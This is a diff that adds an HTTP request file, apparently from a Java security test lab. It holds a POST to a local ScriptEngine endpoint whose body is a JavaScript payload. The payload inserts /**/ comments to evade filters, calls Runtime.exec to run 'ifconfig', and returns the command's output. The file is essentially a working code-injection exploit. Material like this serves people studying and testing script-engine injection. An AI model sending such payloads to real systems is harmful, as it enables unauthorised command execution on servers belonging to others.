@@ -1,0 +1,8 @@
+###
+# ScriptEngine
+POST /code/ScriptEngine/case1 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+var runtime = java.lang./**/Runtime./**/getRuntime();var process = runtime.exec("ifconfig");var inputStream = process.getInputStream();var scanner = new java.util.Scanner(inputStream,"GBK").useDelimiter("\\A");var result = scanner.hasNext() ? scanner.next() : "";scanner.close();result;
+
